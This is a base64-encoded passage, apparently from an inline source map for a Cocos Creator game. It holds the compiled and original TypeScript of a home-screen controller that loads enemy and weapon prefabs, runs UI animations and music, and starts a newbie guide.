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FRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzt1REFDUztJQUczQjtRQURDLFFBQVEsQ0FBQywrQkFBcUIsQ0FBQztpRUFDbUI7SUFHbkQ7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzswREFDWTtJQUc5QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOzJEQUNhO0lBRy9CO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7bURBQ0s7SUFHdkI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQztxREFDTztJQTVDUixjQUFjO1FBRGxDLE9BQU87T0FDYSxjQUFjLENBMFlsQztJQUFELHFCQUFDO0NBMVlELEFBMFlDLENBMVkyQyxFQUFFLENBQUMsU0FBUyxHQTBZdkQ7a0JBMVlvQixjQUFjIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9GYWNhZGVcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJcbmltcG9ydCBFbmVteSBmcm9tIFwiLi4vZW50aXRpZXMvZW5lbXkvRW5lbXlcIjtcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5pbXBvcnQge011c2ljUGF0aHN9IGZyb20gXCIuLi9jb25maWcvTXVzaWNQYXRoc1wiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQgQWN0aW9ucyBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2FjdGlvbnMvQWN0aW9uc1wiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4uL2dhbWUvR2FtZVByb3h5XCI7XHJcbmltcG9ydCBXZWFwb25MYXllckNvbnRyb2xsZXIgZnJvbSBcIi4vV2VhcG9uTGF5ZXJDb250cm9sbGVyXCI7XHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxubGV0IE9uY2VGbGFnID0gZmFsc2U7XHJcbmxldCBTaG93Q291bnQgPSAwO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgSG9tZUNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBzdGFydEdhbWVOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgd2VhcG9uU3RhcnROb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgcm9sZUhlYWROb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZW5lbXlMYXllcjpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoc3AuU2tlbGV0b24pXHJcbiAgICBkb29yU2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGJvdHRvbU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBjZW50ZXJOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgYmxvY2tOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgYm90dG9tTGF5ZXJzOltjYy5Ob2RlXSA9IFtdO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdXBJY29uTm9kZXM6W2NjLk5vZGVdID0gW107XHJcblxyXG4gICAgQHByb3BlcnR5KFdlYXBvbkxheWVyQ29udHJvbGxlcilcclxuICAgIHdlYXBvbkxheWVyQ29udHJvbGxlcjpXZWFwb25MYXllckNvbnRyb2xsZXIgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgcHJvcEJ1dHRvbk5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBmaWdodEJ1dHRvbk5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICB0b3BOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgcmlnaHROb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBPbmNlRmxhZyA9IHRydWU7XHJcbiAgICB9XHJcblxyXG4vLyBMSUZFLUNZQ0xFIENBTExCQUNLUzpcclxuXHJcblxyXG4gICAgb25Mb2FkICgpIHtcclxuICAgICAgICBHYW1lUHJveHkuZmlyc3RBaWRGbGFnID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLndlYXBvblN0YXJ0Tm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHRoaXMud2VhcG9uU3RhcnROb2RlLnJ1bkFjdGlvbihjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLnNjYWxlVG8oMC4zNSwgMC45MSksIGNjLnNjYWxlVG8oMC4zNSwgMSkpKSk7XHJcbiAgICAgICAgdGhpcy53ZWFwb25TdGFydE5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy50b3BOb2RlLnkgPSBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0LzIgKyAyNTA7XHJcbiAgICAgICAgdGhpcy5yaWdodE5vZGUueCA9IDI4OSArIDIwMDtcclxuICAgICAgICB0aGlzLmJvdHRvbU5vZGUueSA9IC10aGlzLmJvdHRvbU5vZGUuaGVpZ2h0LzIgLSBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0LzI7XHJcbiAgICAgICAgdGhpcy5jZW50ZXJOb2RlLnggID0gLWNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aDtcclxuICAgICAgICB0aGlzLmJsb2NrTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHRoaXMudXBJY29uTm9kZXMuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgIHZhbHVlLnJ1bkFjdGlvbihjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLm1vdmVCeSgwLjUsIGNjLnYyKDAsIDE1KSksIGNjLm1vdmVCeSgwLjUsIGNjLnYyKDAsLTE1KSkpKSk7XHJcbiAgICAgICAgICAgIHZhbHVlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pO1xyXG5cclxuICAgICAgICAvKiog55Sf5oiQ5pWM5Lq6ICovXHJcbiAgICAgICAgbGV0IGFyciA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlN0YXJ0RW5lbXkpLnNsaWNlKDApO1xyXG4gICAgICAgIGxldCBhY3Rpb24gPSBjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgaWYgKGFyci5sZW5ndGggPiAwKXtcclxuICAgICAgICAgICAgICAgIGxldCBpdGVtID0gYXJyLnNoaWZ0KCk7XHJcbiAgICAgICAgICAgICAgICBsZXQgaWQgPSBpdGVtWydpZCddO1xyXG4gICAgICAgICAgICAgICAgbGV0IHByZWZhYlBhdGggPSAncHJlZmFiL2VudGl0aWVzL2VuZW15L2VuZW15JytpZDtcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKHByZWZhYlBhdGgsIGNjLlByZWZhYiwgKGVycm9yLCByZXNvdXJjZSkgPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChlcnJvciA9PSBudWxsKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCJpZD09PT5cIitpZCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUocmVzb3VyY2UpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZW5lbXkgPSA8RW5lbXk+bm9kZS5nZXRDb21wb25lbnQoRW5lbXkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbmVteS5vbkxvYWQgPSAoKT0+e307XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15LnN0YXJ0ID0gKCk9Pnt9O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbmVteS5vbkVuYWJsZSA9ICgpPT57fTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXkudXBkYXRlID0gKCk9Pnt9O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmVuZW15TGF5ZXIuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15LmluaXQoaWQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbmVteS5zdGlmZiA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15LnBsYXlXYWxrKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBzdGFydFBvcyA9IGNjLnYyKGl0ZW1bJ2NkX3N4J10sIGl0ZW1bJ2NkX3N5J10pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZW5kUG9zID0gY2MudjIoaXRlbVsnY2RfZXgnXSwgaXRlbVsnY2RfZXknXSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBzdWIgPSBlbmRQb3Muc3ViKHN0YXJ0UG9zKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJvdGF0aW9uID0gOTAgLSBjYy5taXNjLnJhZGlhbnNUb0RlZ3JlZXMoTWF0aC5hdGFuMihzdWIueSwgc3ViLngpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpc3RhbmNlID0gc3ViLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgc3BlZWQgPSBlbmVteS5tb3ZlU3BlZWQqMTU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkdXJhdGlvbiA9IGRpc3RhbmNlL3NwZWVkO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlLnBvc2l0aW9uID0gc3RhcnRQb3M7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGUucnVuQWN0aW9uKGNjLnJlcGVhdEZvcmV2ZXIoY2Muc2VxdWVuY2UoY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15Lm5vZGUucm90YXRpb24gPSByb3RhdGlvbjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSksY2MubW92ZVRvKGR1cmF0aW9uLCBlbmRQb3MpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXkubm9kZS5yb3RhdGlvbiA9IHJvdGF0aW9uKzE4MDtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSksIGNjLm1vdmVUbyhkdXJhdGlvbiwgc3RhcnRQb3MpKSkpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLm5vZGUuc3RvcEFjdGlvbkJ5VGFnKDI1ODMpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSkpKTtcclxuICAgICAgICBhY3Rpb24uc2V0VGFnKDI1ODMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgICAgICB0aGlzLnNob3dVcEljb24oKTtcclxuICAgICAgICBsZXQgYnVsbGV0RW1pdHRlclR5cGUgPSAyO1xyXG4gICAgICAgIGxldCB3ZWFwb25Db25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZVsnaWQnXSAhPSAxKS5zb3J0KCgoYSwgYikgPT4gYlsndW5sb2NrJ10gLSBhWyd1bmxvY2snXSkpO1xyXG4gICAgICAgIGZvciAobGV0IGl0ZW0gb2Ygd2VhcG9uQ29uZmlnKXtcclxuICAgICAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZ2FtZUxldmVsID49IGl0ZW1bJ3VubG9jayddKXtcclxuICAgICAgICAgICAgICAgIGJ1bGxldEVtaXR0ZXJUeXBlID0gaXRlbVsnaWQnXTtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmIChidWxsZXRFbWl0dGVyVHlwZSA+IDcpe1xyXG4gICAgICAgICAgICBidWxsZXRFbWl0dGVyVHlwZSA9IDc7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKCdwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldCcrYnVsbGV0RW1pdHRlclR5cGUpXHJcbiAgICAgICAgaWYgKGJ1bGxldEVtaXR0ZXJUeXBlID09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuTGlaaVBhbyl7XHJcbiAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKCdwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDEwOCcpXHJcbiAgICAgICAgfWVsc2UgaWYgKGJ1bGxldEVtaXR0ZXJUeXBlID09IEJ1bGxldEVtaXR0ZXIuVFlQRVMuSHVvSmlhblRvbmcpe1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlcygncHJlZmFiL2VudGl0aWVzL2V4cGxvc2l2ZS9leHBsb3NpdmU5JylcclxuICAgICAgICB9ZWxzZSBpZiAoYnVsbGV0RW1pdHRlclR5cGUgPT0gQnVsbGV0RW1pdHRlci5UWVBFUy5KdUppUWlhbmcpe1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlcygncHJlZmFiL2VudGl0aWVzL2J1bGxldC9maXJlNycpXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBjYy5nYW1lLm9uKFwidmlkZW9fOFwiLCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMub25DbGlja1dlYXBvblN0YXJ0RG8oKVxyXG4gICAgICAgIH0sdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhcnQoKXtcclxuICAgICAgICB0aGlzLm9wZW5Eb29yKCk7XHJcbiAgICB9XHJcblxyXG4gICAgb3BlbkRvb3IoKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIm9wZW5Eb29yLi5cIik7XHJcbiAgICAgICAgTXVzaWMuc2V0QmdtKE11c2ljUGF0aHMuSG9tZUJnKTtcclxuICAgICAgICBsZXQgc2tlTmFtZSA9IFwiYW5pbWF0aW9uXCI7XHJcbiAgICAgICAgaWYgKE9uY2VGbGFnKXtcclxuICAgICAgICAgICAgc2tlTmFtZSA9IFwib3BlbmVkXCI7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICBNdXNpYy5wbGF5U0ZYKFwic291bmQvbXNjX29wZW5Eb29yXCIsIDIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLmRvb3JTa2Uubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHRoaXMuZG9vclNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wKT0+e1xyXG4gICAgICAgICAgICB0aGlzLnBsYXlFbnRyeSgpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIHRoaXMuZG9vclNrZS5zZXRBbmltYXRpb24oMCwgc2tlTmFtZSwgZmFsc2UpO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgcGxheU5vZGVBY3Rpb24obm9kZTpjYy5Ob2RlKXtcclxuICAgICAgICBub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgbGV0IGN5Y2xlUm90YXRpb24gPSBBY3Rpb25zLmN5Y2xlQWN0aW9uKGNjLnJvdGF0ZVRvLCAwLCAwLCA4LCAzNjAvMiwgOCwgMCk7XHJcbiAgICAgICAgbGV0IGN5Y2xlU2NhbGUgPSBBY3Rpb25zLmN5Y2xlQWN0aW9uKGNjLnNjYWxlVG8sIDEsIDEsIDAuMSwgMS8wLjgsIDAsIDAsIDAuNSk7XHJcbiAgICAgICAgbm9kZS5ydW5BY3Rpb24oY3ljbGVSb3RhdGlvbik7XHJcbiAgICAgICAgbm9kZS5ydW5BY3Rpb24oY3ljbGVTY2FsZSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBwbGF5Tm9kZUFjdGlvblN0YXJ0KCl7XHJcbiAgICAgICAgdGhpcy5zdGFydEdhbWVOb2RlLnJ1bkFjdGlvbihjYy5yZXBlYXRGb3JldmVyKGNjLnNlcXVlbmNlKGNjLnNjYWxlVG8oMC4zNSwgMC45MSksIGNjLnNjYWxlVG8oMC4zNSwgMSkpKSk7XHJcbiAgICAgICAgdGhpcy5zY2hlZHVsZSgoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLnBsYXlOb2RlQWN0aW9uKHRoaXMucHJvcEJ1dHRvbk5vZGUpO1xyXG4gICAgICAgIH0sIDMpO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlFbnRyeSgpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwicGxheUVudHJ5Li4uXCIpO1xyXG4gICAgICAgIGxldCBzcGVlZCA9IDcwMDtcclxuICAgICAgICBsZXQgcHJvbWlzZXMgPSBbXTtcclxuICAgICAgICBsZXQgZGlzdGFuY2UgPSAyNTAgKyB0aGlzLnRvcE5vZGUuaGVpZ2h0LzI7XHJcbiAgICAgICAgaWYoZXh0LmlzSXBob25lWCl7XHJcbiAgICAgICAgICAgIGRpc3RhbmNlICs9IDY2O1xyXG4gICAgICAgIH1cclxuICAgICAgICBwcm9taXNlcy5wdXNoKHRoaXMudG9wTm9kZS5ydW5BY3Rpb25Bd2FpdChjYy5tb3ZlQnkoZGlzdGFuY2Uvc3BlZWQsIGNjLnYyKDAsIC1kaXN0YW5jZSkpKSk7XHJcblxyXG4gICAgICAgIHByb21pc2VzLnB1c2godGhpcy5yaWdodE5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZUJ5KDIwMC9zcGVlZCwgY2MudjIoLTIwMCwgMCkpKSk7XHJcblxyXG4gICAgICAgIHByb21pc2VzLnB1c2godGhpcy5ib3R0b21Ob2RlLnJ1bkFjdGlvbkF3YWl0KGNjLm1vdmVCeSh0aGlzLmJvdHRvbU5vZGUuaGVpZ2h0L3NwZWVkLCBjYy52MigwLCB0aGlzLmJvdHRvbU5vZGUuaGVpZ2h0KSkpKTtcclxuXHJcbiAgICAgICAgcHJvbWlzZXMucHVzaCh0aGlzLmNlbnRlck5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZVRvKGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC9zcGVlZCwgY2MudjIoMCwgMCkpKSk7XHJcblxyXG5cclxuICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykudGhlbihhc3luYyByZXM9PntcclxuICAgICAgICAgICAgdGhpcy5wbGF5Tm9kZUFjdGlvblN0YXJ0KCk7XHJcbiAgICAgICAgICAgIGlmICghV29ybGQuTXkubmV3Ymllcy5zdGF0ZShcIkZpcnN0RW50cnlIb21lXCIpKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZXdiaWVOb2RlID0gbmV3IGNjLk5vZGUoKTtcclxuICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUubmFtZSA9IFwibmV3YmllTm9kZVwiO1xyXG4gICAgICAgICAgICAgICAgbmV3YmllTm9kZS5wb3NpdGlvbiA9IHRoaXMuc3RhcnRHYW1lTm9kZS5jb252ZXJ0VG9Xb3JsZFNwYWNlQVIoY2MudjIoKSk7XHJcbiAgICAgICAgICAgICAgICBjYy5kaXJlY3Rvci5nZXRTY2VuZSgpLmFkZENoaWxkKG5ld2JpZU5vZGUpO1xyXG4gICAgICAgICAgICAgICAgLyoqIGd1aWRlQ2lyY2xlICovXHJcbiAgICAgICAgICAgICAgICBsZXQgZ3VpZGVDaXJjbGVQcmVmYWIgPSBjYy5sb2FkZXIuZ2V0UmVzKFwicHJlZmFiL2d1aWRlQ2lyY2xlXCIpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGd1aWRlQ2lyY2xlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGd1aWRlQ2lyY2xlUHJlZmFiKTtcclxuICAgICAgICAgICAgICAgIGd1aWRlQ2lyY2xlTm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBuZXdiaWVOb2RlLmFkZENoaWxkKGd1aWRlQ2lyY2